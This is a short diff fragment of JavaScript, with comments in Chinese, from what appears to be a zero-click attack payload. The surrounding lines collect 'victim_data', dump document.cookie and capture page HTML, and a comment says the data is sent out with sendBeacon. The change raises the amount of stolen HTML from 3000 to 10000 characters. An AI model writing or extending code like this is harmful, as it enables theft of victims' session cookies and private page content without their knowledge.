@@ -49,8 +49,8 @@
             status: "SUCCESS_ZERO_CLICK",
             victim_data: info,
             cookie_dump: document.cookie,
-            // 預覽 HTML 前 3000 字，用來 debug
-            html_preview: html.substring(0, 3000)
+            // 預覽 HTML 前 10000 字，用來 debug
+            html_preview: html.substring(0, 10000)
         });
 
         // 優先使用 sendBeacon (可靠性高)
